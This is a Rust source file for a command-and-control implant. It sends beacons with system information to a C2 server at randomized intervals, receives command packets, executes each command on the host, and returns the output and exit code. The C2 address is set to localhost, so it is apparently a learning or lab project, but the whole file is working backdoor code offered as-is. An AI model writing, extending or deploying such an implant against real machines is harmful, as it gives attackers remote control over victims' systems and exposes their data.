use std::{
    io::Write,
    net::TcpStream,
    process::Command,
    thread::{self, sleep},
    time::Duration,
};

const C2_ADDRESS: &str = "127.0.0.1:9120";

use common::{IMPLANT_REPORT_RATE_SECONDS, Packet, SystemInfo, encode, read_packet};
use rand::{Rng, rng};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    thread::spawn(move || {
        loop {
            connect()
                .write(
                    encode(Packet::Beacon {
                        system_info: SystemInfo::get(),
                    })
                    .unwrap()
                    .as_slice(),
                )
                .unwrap();

            sleep(Duration::from_secs(
                rng().random_range(IMPLANT_REPORT_RATE_SECONDS),
            ));
        }
    });

    loop {
        let mut connection = connect();
        let packet = read_packet(&mut connection).unwrap();

        match packet {
            Packet::CommandPacket { command } => {
                let command = Command::new(command)
                    .spawn()
                    .unwrap()
                    .wait_with_output()
                    .unwrap();

                connection
                    .write(
                        encode(Packet::CommandResult {
                            output: String::from_utf8_lossy(command.stdout.as_slice()).to_string(),
                            exit_code: command.status.code().unwrap(),
                        })
                        .unwrap()
                        .as_slice(),
                    )
                    .unwrap();
            }

            _ => {}
        }
    }
}

fn connect() -> TcpStream {
    loop {
        let stream = TcpStream::connect(C2_ADDRESS);
        if stream.is_err() {
            println!("Failed to estabilish a connection to the C2, retrying in a minute...");
            sleep(Duration::from_secs(if cfg!(debug_assertions) {
                10
            } else {
                60
            }));
            continue;
        }

        return stream.unwrap();
    }
}
